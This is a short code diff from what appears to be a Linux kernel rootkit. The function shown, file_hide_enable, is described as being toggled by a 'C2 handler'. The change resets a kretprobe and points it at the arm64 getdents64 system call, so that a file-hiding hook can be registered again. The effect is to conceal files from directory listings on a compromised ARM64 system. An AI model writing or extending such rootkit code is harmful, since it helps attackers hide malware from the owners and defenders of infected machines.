@@ -186,6 +186,9 @@ void file_hide_exit(void)
 //called by the C2 handler for toggle commands.
 int file_hide_enable(void)
 {
+	//reset internel krp state for re-registration
+	memset(&file_hide_krp.kp, 0, sizeof(file_hide_krp.kp));
+	file_hide_krp.kp.symbol_name = "__arm64_sys_getdents64";
 	return file_hide_init();
 }
 
